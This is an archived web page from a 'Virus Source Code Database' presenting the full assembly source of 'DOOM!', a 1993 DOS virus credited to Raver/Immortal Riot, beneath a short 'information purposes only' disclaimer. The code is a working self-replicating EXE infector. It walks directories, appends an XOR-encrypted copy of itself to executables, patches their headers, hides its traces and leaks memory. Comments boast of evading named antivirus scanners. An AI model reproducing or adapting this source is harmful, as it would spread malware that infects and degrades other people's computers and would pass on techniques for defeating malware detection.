<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: raver_asm</title>
<meta name="KEYWORDS" content="raver.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for raver.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="rage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rage_asm.php">rage_asm</a><br>
<a href="rammonst_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rammonst_asm.php">rammonst_asm</a><br>
<a href="rand_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rand_asm.php">rand_asm</a><br>
<a href="ranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ranger_asm.php">ranger_asm</a><br>
<a href="rapbetr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapbetr_asm.php">rapbetr_asm</a><br>
<a href="rape1882_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape1882_asm.php">rape1882_asm</a><br>
<a href="rapeiib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapeiib_asm.php">rapeiib_asm</a><br>
<a href="rape_v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape_v20_asm.php">rape_v20_asm</a><br>
<a href="rausr757_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rausr757_asm.php">rausr757_asm</a><br>
<a href="ravage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ravage_asm.php">ravage_asm</a><br>
<a href="raver_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raver_asm.php">raver_asm</a><br>
<a href="raygun2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun2_asm.php">raygun2_asm</a><br>
<a href="raygun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun_asm.php">raygun_asm</a><br>
<a href="readvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/readvir_asm.php">readvir_asm</a><br>
<a href="rec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rec_asm.php">rec_asm</a><br>
<a href="red_merc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/red_merc_asm.php">red_merc_asm</a><br>
<a href="redmerc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redmerc_asm.php">redmerc_asm</a><br>
<a href="redx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redx_asm.php">redx_asm</a><br>
<a href="replic_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/replic_d_asm.php">replic_d_asm</a><br>
<a href="republic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/republic_asm.php">republic_asm</a><br>
<a href="retal1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal1_asm.php">retal1_asm</a><br>
<a href="retal2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal2_asm.php">retal2_asm</a><br>
<a href="retal3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal3_asm.php">retal3_asm</a><br>
<a href="retal4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal4_asm.php">retal4_asm</a><br>
<a href="reyes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/reyes_asm.php">reyes_asm</a><br>
<a href="richard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richard__asm.php">richard__asm</a><br>
<a href="richards_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richards_asm.php">richards_asm</a><br>
<a href="riot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riot_asm.php">riot_asm</a><br>
<a href="rip_hd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rip_hd_asm.php">rip_hd_asm</a><br>
<a href="ritzen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ritzen_asm.php">ritzen_asm</a><br>
<a href="riverbot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riverbot_asm.php">riverbot_asm</a><br>
<a href="rizwi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rizwi_asm.php">rizwi_asm</a><br>
<a href="rna_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rna_pas.php">rna_pas</a><br>
<a href="rnd__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd__asm.php">rnd__asm</a><br>
<a href="rnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_asm.php">rnd_asm</a><br>
<a href="rnd_num_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_num_asm.php">rnd_num_asm</a><br>
<a href="romulan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/romulan_asm.php">romulan_asm</a><br>
<a href="roseanne_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roseanne_asm.php">roseanne_asm</a><br>
<a href="roz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roz_asm.php">roz_asm</a><br>
<a href="rtl4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rtl4_asm.php">rtl4_asm</a><br>
<a href="runt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_asm.php">runt_asm</a><br>
<a href="runt_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_b_asm.php">runt_b_asm</a><br>
<a href="runt-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt-b_asm.php">runt-b_asm</a><br>
<a href="rush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_asm.php">rush_asm</a><br>
<a href="rushhour_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhour_asm.php">rushhour_asm</a><br>
<a href="rushhr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhr_asm.php">rushhr_asm</a><br>
<a href="rush_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_vir_asm.php">rush_vir_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; VirusName : DOOM!
; Origin    : Sweden
; Author    : Raver
; Date      : 23/12/93

; My second scratch contribution to this issue. It's a simple non-over-
; writing, non-destructive exe-infector that "eats up" a bit memory on
; every run. It restore date/time stamps and uses an encryption routine
; to avoid discovery from virus scanners. Of'cos no virus scanners are
; able to detect it. This includes Scan/FindViru/MSAV/CPAV/F-Prot and
; TBAV's most heuristic scanner. Well, 9 out of 10 viruses, that's nothing
; but pure bullshit!, ha!, this "wanna-be" can't find a single flag in 
; this code!

; After these two moderate, educational viruses I'm planning to do some
; "fancier" memory resident viruses to the next issue. If I've got some
; time, that is. Fucking military service :)

; 컴-컴컴컴-컴컴컴컴컴--컴컴컴컴컴컴--컴컴컴---컴컴컴컴컴컴-컴컴-
;			        DOOM!
; 컴-컴컴컴-컴컴컴컴컴--컴컴컴컴컴컴--컴컴컴---컴컴컴컴컴컴-컴컴-

cseg	segment byte public 'code'
	assume cs:cseg, ds:cseg

	org 100h

start_of_virus:

    call get_offset
get_offset:			;alternative way to get the delta
    mov di,sp			;offset without activating any flags in
    mov bp,word ptr ss:[di]	;TB-scan
    sub bp,offset get_offset
    inc sp
    inc sp

    push ds			;save es & ds
    push es
    push cs			;and point ds to code segment
    pop ds

    call encrypt_decrypt	;decrypt contents of file

start_of_encryption:
    cld				;clear direction flag

    mov ah,1ah			;set new dta area
    lea dx,[bp+dta_area]
    int 21h

    mov bx,es
    push cs			;es points to code segment
    pop es

    lea si,[bp+return2_buffer]	;this code prepares the return code
    lea di,[bp+return_buffer]
    movsw			;transfer buffer contents
    lodsw
    add ax,bx			;bx holds start es = psp
    add ax,10h
    stosw

;   lea di,[bp+stack_return]
;   lea si,[bp+stack_save]	;si already points to stack_save
    add di,8			;saving a byte with this code
    lodsw			;prepares the restore of ss/sp
    add ax,bx
    add ax,10h
    stosw
    movsw


    mov ah,47h			;save starting directory
    xor dl,dl
    lea si,[bp+save_dir]
    int 21h

find_new_files:			;start finding files
    mov ah,4eh
    mov cx,7
    lea dx,[bp+search_pattern]
find_files:
    int 21h

    jnc open_file		;if found a file
    lea dx,[bp+dir_mask]	;else change directory
    mov ah,3bh
    int 21h
    jnc find_new_files
    jmp no_more_files		;end of all files

open_file:			;open the found file
    mov ax,3d02h
    lea dx,[bp+dta_area+1eh]
    int 21h

    xchg ax,bx			;file handle in bx

    mov ah,3fh			;read the exe header to exe_header
    mov cx,18h
    lea dx,[bp+exe_header]
    int 21h

    lea si,[bp+exe_header]	;check if it's really a executable
    lodsw
    cmp ax,'ZM'
    je check_infected
    cmp ax,'MZ'
    je check_infected
    jmp no_exe			;else jump

check_infected:

    add si,10h			;saving another byte
;   lea si,[bp+exe_header+12h]
    lodsw
    cmp ax,'Ri'			;is it already infected?
    jne start_infect
    jmp already_infected


start_infect:
    lea di,[bp+return2_buffer]	;put the files ip/cs in return2_buffer
    movsw
    movsw

    lea si,[bp+exe_header+0eh]	;save the files ss/sp in stack_save
    movsw
    movsw

    lea di,[bp+exe_header+12h]	;mark the file infected
    mov ax,'Ri'
    stosw

    mov al,2			;go to end_of_file
    call go_eof			;dx/ax is file length at return

    mov cx,10h			;use div to save bytes instead of speed
    div cx
    sub ax,word ptr ds:[bp+exe_header+8]
    xchg dx,ax
    stosw			;put new ip/cs in exe_header
    xchg dx,ax
    stosw

    inc ax			;put new suitable ss/sp in exe_header
    inc ax
    mov word ptr [bp+exe_header+0eh],ax
    mov word ptr [bp+exe_header+10h],4b0h


    mov ah,2ch			;get system time for random number
    int 21h
    xor dh,dh			;just alter the code a little bit
    or dl,00001010b		;with encryption so TB-scan wont't
    mov word ptr [bp+encryption_value],dx   ;find garbage instruction

    mov ah,40h			;prepare to append virus to file
    lea dx,[bp+start_of_virus]
    call append_virus		;call it

    mov al,2			;go to end of file
    call go_eof

    mov cx,512			;get filesize in 512 modules
    div cx
    inc ax
    mov word ptr [bp+exe_header+2],dx	;put modulo/filesize in
    mov word ptr [bp+exe_header+4],ax	;exe header


    xor al,al			;go to beginning of file
    call go_eof

    mov ah,40h			;write new exe header
    mov cx,18h
    lea dx,[bp+exe_header]
    int 21h

    lea si,[bp+dta_area+16h]	;restore time/date stamp
    mov cx,word ptr [si]
    mov dx,word ptr [si+2]
    mov ax,5701h
    int 21h

already_infected:
no_exe:

    mov ah,3eh			;close file
    int 21h

    mov ax,4301h		;restore file attribute
    mov cl,byte ptr [bp+dta_area+15h]
    lea dx,[bp+dta_area+1eh]
    int 21h

    mov ah,4fh			;find next file
    jmp find_files

no_more_files:

    lea dx,[bp+save_dir]	;restore starting directory
    mov ah,3bh
    int 21h

    pop es			;shrink memory block
    mov ah,4ah
    mov bx,10000
    int 21h
    push es

    mov ah,48h			;allocate a new 3k block
    mov bx,192
    int 21h
    jc no_mem
    dec ax
    mov es,ax
    mov word ptr es:[1],0008h	;mark DOS as owner and it will
no_mem:				;reduce available memory to DOS

    pop es			;restore old es/ds
    pop ds

    cli				;must use this before altering ss/sp
    mov ss,word ptr cs:[bp+stack_return]    ;put back original ss/sp
    mov sp,word ptr cs:[bp+stack_return+2]
    sti				;interrupts allowed again

end_part:
db 0eah				;jmp to original ip
return_buffer db 0,0,0,0
return2_buffer dw 0,0fff0h	;code for carrier file to exit
stack_save dd ?
stack_return dd ?
dir_mask db '..',0
search_pattern db '*.exe',0
signature db "DOOM! (c) '93 Raver/Immortal Riot"
go_eof:				;procedure to go to beginning and
    mov ah,42h			;end of file
    xor cx,cx			;this saves a few bytes as it's
    cwd				;used a few times
    int 21h
    ret
end_of_encryption:
pad db 0			;pad out a byte so first byte of
				;encryption value won't be overwritten
encryption_value dw 0

encrypt_decrypt:		;cryptation routine
    mov si,word ptr [bp+encryption_value]
    lea di,[bp+start_of_encryption]
    mov cx,(end_of_encryption-start_of_encryption+1)/2
crypt_loop:
    xor word ptr [di],si
    inc di
    inc di
    loop crypt_loop
    ret

append_virus:
    call encrypt_decrypt	;encrypt virus before write
    mov cx,end_of_virus-start_of_virus	;cx is length of virus
    int 21h			;call 40h
    call encrypt_decrypt	;decrypt virus again
    ret
end_of_virus:
exe_header db 18h dup(?)		;don't need to copy this shit
dta_area db 43 dup(?)			;to the next file to infect
save_dir db 64 dup(?)			;return adress is already saved!
cseg ends
end start_of_virus
</textarea></td></tr></table></body></html>
